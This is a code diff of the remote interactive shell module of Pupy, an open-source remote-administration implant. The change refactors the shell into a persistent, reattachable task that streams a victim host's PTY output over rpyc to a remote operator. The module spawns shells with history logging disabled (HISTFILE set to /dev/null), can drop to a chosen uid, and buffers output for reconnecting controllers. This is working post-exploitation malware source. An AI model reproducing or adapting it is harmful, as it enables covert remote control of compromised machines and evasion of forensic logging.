@@ -2,21 +2,63 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+__all__ = [ 'acquire', 'release' ]
+
 import sys
 import os
 import os.path
 import termios
 import pty
-import tty
 import fcntl
 import subprocess
-import threading
 import select
 import rpyc
 import array
 import pwd
 import errno
-from pupy import obtain
+import shlex
+
+from collections import deque
+
+from pupy import manager, Task
+
+DEFAULT_SHELL = None
+
+def propose_shell():
+    PATHS = os.environ.get(
+        'PATH', '/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/system/bin'
+    ).split(':')
+
+    SHELLS = [ 'bash', 'ash', 'zsh', 'sh', 'ksh', 'csh' ]
+
+    for shell in (os.path.join(p, shell) for shell in SHELLS for p in PATHS):
+        yield shell
+
+    if 'SHELL' in os.environ:
+        yield os.environ['SHELL']
+
+    if os.path.isfile('/etc/shells'):
+        with open('/etc/shells', 'r') as shells:
+            for shell in shells:
+                shell = shell.strip()
+                if not shell.startswith('/'):
+                    continue
+
+                yield shell
+
+def find_shell():
+    global DEFAULT_SHELL
+
+    if not DEFAULT_SHELL:
+        for shell in propose_shell():
+            if os.path.isfile(shell) and os.access(shell, os.X_OK):
+                DEFAULT_SHELL = shell
+                break
+
+    if not DEFAULT_SHELL:
+        DEFAULT_SHELL = '/bin/sh'
+
+    return DEFAULT_SHELL
 
 def prepare(suid):
     if suid is not None:
@@ -34,7 +76,7 @@ def prepare(suid):
         try:
             path = os.ttyname(sys.stdin.fileno())
             os.chown(path, suid, sgid)
-        except Exception, e:
+        except:
             pass
 
         try:
@@ -60,21 +102,34 @@ def prepare(suid):
         # No life without control terminal :(
         os._exit(-1)
 
-class PtyShell(object):
-    def __init__(self):
+class PtyShell(Task):
+    __slots__ = (
+        'prog', 'master', 'real_stdout',
+        'argv', 'term', 'suid',
+        'read_cb', 'close_cb', '_buffer'
+    )
+
+    def __init__(self, manager, argv=None, term=None, suid=None):
+        super(PtyShell, self).__init__(manager)
+
         self.prog = None
         self.master = None
         self.real_stdout = sys.stdout
 
+        self.argv = argv
+        self.term = term
+        self.suid = suid
+
+        self.read_cb = None
+        self.close_cb = None
+
+        self._buffer = deque(maxlen=50)
+
+    def stop(self):
+        super(PtyShell, self).stop()
+        self.close()
+
     def close(self):
-        if self.master:
-            try:
-                self.master.close()
-            except:
-                pass
-
-            self.master = None
-
         if self.prog is not None:
             rc = None
 
@@ -100,35 +155,58 @@ class PtyShell(object):
                 except:
                     pass
 
-    def __del__(self):
-        self.close()
+        if self.master:
+            try:
+                self.master.close()
+            except:
+                pass
 
-    def spawn(self, argv=None, term=None, suid=None):
-        if argv is None:
-            if 'SHELL' in os.environ:
-                argv = [os.environ['SHELL']]
-            elif 'PATH' in os.environ: #searching sh in the path. It can be unusual like /system/bin/sh on android
-                for shell in [ "bash", "sh", "ksh", "zsh", "csh", "ash" ]:
-                    for path in os.environ['PATH'].split(':'):
-                        fullpath=os.path.join(path.strip(),shell)
-                        if os.path.isfile(fullpath):
-                            argv=[fullpath]
-                            break
+            self.master = None
 
-                    if argv:
-                        break
+        if self._buffer:
+            self._buffer.clear()
+            self._buffer = None
+
+        self.read_cb = None
+        self.write_cb = None
+
+        self.argv = None
+        self.term = None
+        self.suid = None
+
+        self.prog = None
+        self.master = None
+        self.real_stdout = None
+
+    def task(self):
+        argv = None
+
+        print "ARGV:", self.argv
+
+        if not self.argv:
+            argv = [find_shell()]
+
+        elif type(self.argv) in (str, unicode):
+            argv = shlex.split(self.argv)
         else:
-            argv=obtain(argv) #this transforms a rpyc netref list into a list
+            argv = self.argv
+
+        print "SET ARGV:", self.argv
+
+        PS1 = '[pupy]> '
 
         if argv:
-            shell = argv[0].split('/')[-1]
+            shell = os.path.basename(argv[0])
+            print "SHELL", shell
             if shell == 'bash':
-                argv = [ argv[0], '--noprofile', '--norc' ] + argv[1:]
+                PS1 = r'[pupy:\W]> '
+                argv.insert(1, '--norc')
+                argv.insert(1, '--noprofile')
         else:
-            argv= ['/bin/sh']
+            argv = ['/bin/sh']
 
-        if term is not None:
-            os.environ['TERM']=term
+        if self.term is not None:
+            os.environ['TERM'] = self.term
 
         master, slave = pty.openpty()
         self.master = os.fdopen(master, 'rb+wb', 0) # open file in an unbuffered mode
@@ -138,15 +216,19 @@ class PtyShell(object):
         assert flags >= 0
 
         env = os.environ.copy()
-        env['HISTFILE'] = '/dev/null'
-        env['PATH'] = ':'.join([
-            '/bin', '/sbin', '/usr/bin', '/usr/sbin',
-            '/usr/local/bin', '/usr/local/sbin'
-        ])
+        env.update({
+            'PS1': PS1,
+            'HISTFILE': '/dev/null',
+            'PATH': ':'.join([
+                '/bin', '/sbin', '/usr/bin', '/usr/sbin',
+                '/usr/local/bin', '/usr/local/sbin'
+            ])
+        })
 
         if 'PATH' in os.environ:
-            env['PATH'] = env['PATH'] + ':' + os.environ['PATH']
+            env['PATH'] += ':' + os.environ['PATH']
 
+        suid = self.suid
         if suid is not None:
             try:
                 suid = int(suid)
@@ -176,6 +258,20 @@ class PtyShell(object):
         )
         os.close(slave)
 
+        try:
+            self._read_loop()
+        finally:
+            try:
+                self.stop()
+            except:
+                pass
+
+            try:
+                if self.close_cb:
+                    self.close_cb()
+            except:
+                pass
+
     def write(self, data):
         if not self.master:
             return
@@ -183,8 +279,24 @@ class PtyShell(object):
         try:
             self.master.write(data)
             self.master.flush()
+
         except:
-            self.close()
+            self.stop()
+
+    def attach(self, read_cb, close_cb):
+        if self.active:
+            self.read_cb = rpyc.async(read_cb)
+            self.close_cb = rpyc.async(close_cb)
+
+            if self._buffer:
+                for item in self._buffer:
+                    self.read_cb(item)
+        else:
+            close_cb()
+
+    def detach(self):
+        self.read_cb = None
+        self.close_cb = None
 
     def set_pty_size(self, p1, p2, p3, p4):
         if not self.master:
@@ -196,9 +308,7 @@ class PtyShell(object):
         except:
             pass
 
-    def _read_loop(self, print_callback, close_callback):
-        cb = rpyc.async(print_callback)
-        close_cb = rpyc.async(close_callback)
+    def _read_loop(self):
         not_eof = True
         fd = self.master.fileno()
 
@@ -223,7 +333,10 @@ class PtyShell(object):
                     data = None
 
                 if data:
-                    cb(data)
+                    self._buffer.append(data)
+
+                    if self.read_cb:
+                        self.read_cb(data)
                 else:
                     not_eof = False
 
@@ -232,14 +345,18 @@ class PtyShell(object):
             else:
                 break
 
-        self.close()
-        close_cb()
+def acquire(argv=None, term=None, suid=None):
+    shell = manager.get(PtyShell)
 
-    def start_read_loop(self, print_callback, close_callback):
-        t=threading.Thread(
-            target=self._read_loop,
-            args=(print_callback, close_callback)
-        )
+    new = False
+    if not ( shell and shell.active ):
+        shell = manager.create(
+            PtyShell,
+            argv, term, suid)
 
-        t.daemon=True
-        t.start()
+        new = True
+
+    return new, shell
+
+def release():
+    manager.stop(PtyShell)
